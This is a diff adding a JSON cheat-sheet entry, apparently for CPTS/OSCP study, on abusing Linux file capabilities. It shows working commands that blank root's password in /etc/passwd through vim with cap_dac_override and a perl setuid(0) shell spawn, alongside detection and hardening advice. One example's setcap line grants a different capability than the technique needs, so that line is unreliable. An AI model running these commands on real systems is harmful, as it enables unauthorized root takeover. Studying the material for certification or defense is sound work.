@@ -1,0 +1,109 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "getcap",
+    "setcap"
+  ],
+  "tags": [
+    "capabilities",
+    "cap_dac_override",
+    "cap_setuid"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - SUID/SGID & Capabilities",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "cap_dac_override on vim -> blank root's password in /etc/passwd",
+      "command": "rm -f /etc/.passwd.swp\n/usr/bin/vim.basic /etc/passwd\n# :%s/^root:[^:]*:/root::/  then :wq!"
+    },
+    {
+      "label": "How the capability was granted (setcap)",
+      "command": "sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic"
+    },
+    {
+      "label": "OSCP Ch17 \u2014 recursive getcap scan from root (spot cap_setuid binaries)",
+      "command": "/usr/sbin/getcap -r / 2>/dev/null"
+    },
+    {
+      "label": "OSCP Ch17 \u2014 perl cap_setuid exploit: setuid(0) then spawn shell (GTFOBins)",
+      "command": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
+    }
+  ],
+  "notes": "Cap flags: +ep effective+permitted, +ei effective+inheritable, +p permitted, = clear. High-value: cap_setuid, cap_setgid, cap_sys_admin, cap_dac_override. OSCP Ch17: getcap -r / (recursive from root) is the standard scan. cap_setuid+ep on perl/python means any user can setuid(0). GTFOBins confirms the one-liner. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).",
+  "references": [
+    {
+      "title": "Linux capabilities(7)",
+      "url": "https://man7.org/linux/man-pages/man7/capabilities.7.html"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Linux Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ref-capabilities",
+      "note": "Which capabilities are abusable and how.",
+      "rel": "prereq"
+    },
+    {
+      "id": "find-suid-sgid",
+      "note": "SUID enumeration is the sibling technique.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "capabilities",
+  "name": "Capabilities - Enumerate and Abuse",
+  "command": "find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;",
+  "description": "File capabilities grant slices of root power without SUID. Enumerate them, then abuse high-value ones - e.g. a binary with cap_dac_override can overwrite /etc/passwd to blank root's password.",
+  "steps": [
+    {
+      "label": "1. Enumerate capabilities",
+      "command": "find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;\ngetcap /usr/bin/vim.basic"
+    },
+    {
+      "label": "2. Blank root's password (cap_dac_override + vim)",
+      "command": "echo -e ':%s/^root:[^:]*:/root::/\\nwq!' | /usr/bin/vim.basic -es /etc/passwd\nhead -n1 /etc/passwd"
+    },
+    {
+      "label": "3. Become root",
+      "command": "su -"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1548.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Linux capabilities subdivide root privileges into distinct units. If a binary has a dangerous capability set (cap_dac_override, cap_setuid, cap_sys_admin), it can perform privileged operations without being SUID. cap_dac_override bypasses all file permission checks -- so a vim binary with this capability can edit /etc/passwd to remove root's password hash.",
+    "prerequisites": "A binary with a dangerous capability set (cap_dac_override, cap_setuid, cap_net_raw) accessible to the attacker. getcap tool to enumerate.",
+    "impact": "Privilege escalation via a seemingly normal binary. cap_dac_override allows writing to /etc/passwd. cap_setuid allows setting UID to 0. cap_sys_admin is near-equivalent to full root.",
+    "detection": "getcap executed to enumerate capabilities. vim or other editor used to modify /etc/passwd. Auditd: write to /etc/passwd by vim process (non-root). EDR: setuid(0) call from non-root process via capability.",
+    "artifacts": "Auditd: write to /etc/passwd by vim (non-root) | /etc/passwd modification event | File integrity alert on /etc/passwd",
+    "prevention": "Audit all capabilities: find /usr/bin /usr/sbin -type f -exec getcap {} +. Remove unnecessary capabilities. Only grant specific required capabilities (e.g., cap_net_raw for ping, not cap_dac_override for editors). Monitor /etc/passwd with file integrity monitoring.",
+    "misconfiguration": "vim or other editor granted cap_dac_override capability without operational necessity, allowing any user to read/write any file on the system including /etc/passwd.",
+    "vulnerable_config": "# Dangerous capability set\n/usr/bin/vim.basic = cap_dac_override+eip\n\n# This allows:\necho -e ':%s/^root:[^:]*:/root::/\\nwq!' | /usr/bin/vim.basic -es /etc/passwd\n# Removes root password hash -> su gives root",
+    "secure_config": "# Audit and remove unnecessary capabilities\ncap_set=$(find /usr/bin /usr/sbin -exec getcap {} + 2>/dev/null)\necho \"$cap_set\"  # review all entries\n\n# Remove capability from vim\nsetcap -r /usr/bin/vim.basic\n\n# Only grant minimal required capabilities:\n# ping: cap_net_raw (not cap_dac_override)\nsetcap cap_net_raw+ep /usr/bin/ping",
+    "sources": [
+      "HTB M25",
+      "MITRE T1548",
+      "MITRE T1548.001"
+    ]
+  }
+}
